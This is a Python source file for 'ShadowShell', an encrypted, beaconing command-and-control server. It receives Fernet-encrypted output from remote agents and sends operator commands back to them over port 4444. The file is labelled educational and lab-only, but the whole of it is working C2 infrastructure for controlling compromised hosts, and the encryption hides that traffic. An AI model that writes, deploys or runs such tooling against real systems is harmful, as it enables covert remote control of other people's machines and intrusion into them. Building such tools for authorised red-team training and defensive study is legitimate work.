import socket
import argparse
from cryptography.fernet import Fernet

# ShadowShell C2 Server (Encrypted + Beaconing)
# Educational use only. Authorized lab testing only.

def load_key():
    try:
        with open("secret.key", "rb") as key_file:
            return key_file.read()
    except FileNotFoundError:
        print("[-] secret.key not found. Run generate_key.py first!")
        exit(1)

def start_server(host, port, fernet):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    
    print(f"""
    =============================================
       ShadowShell Educational C2 - Server
       Encryption: ENABLED (Fernet)
       Mode: Beaconing (Polling)
       Listening on {host}:{port}
       Waiting for beacons...
       (Press Ctrl+C to exit)
    =============================================
    """)
    
    try:
        while True:
            agent_conn, agent_addr = server.accept()
            
            # 1. Receive beacon (which contains previous command output)
            encrypted_data = agent_conn.recv(4096)
            try:
                decrypted_data = fernet.decrypt(encrypted_data).decode('utf-8')
                print(f"\n[+] Beacon received from {agent_addr[0]}:{agent_addr[1]}")
                print(f"[Agent Output]:\n{decrypted_data}")
            except Exception:
                print(f"[-] Failed to decrypt payload from {agent_addr[0]}.")
                agent_conn.close()
                continue
            
            # 2. Prompt operator for next command
            cmd = input("ShadowShell (cmd)> ")
            if cmd.lower() in ['exit', 'quit']:
                encrypted_cmd = fernet.encrypt(b'exit')
                agent_conn.send(encrypted_cmd)
                agent_conn.close()
                break
            
            # 3. Send command
            encrypted_cmd = fernet.encrypt(cmd.encode('utf-8'))
            agent_conn.send(encrypted_cmd)
            agent_conn.close()
            
    except KeyboardInterrupt:
        print("\n[!] Server shutting down.")
    finally:
        server.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ShadowShell C2 Server")
    parser.add_argument("--host", default="0.0.0.0", help="IP to bind to (default: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=4444, help="Port to listen on (default: 4444)")
    args = parser.parse_args()
    
    key = load_key()
    fernet = Fernet(key)
    start_server(args.host, args.port, fernet)
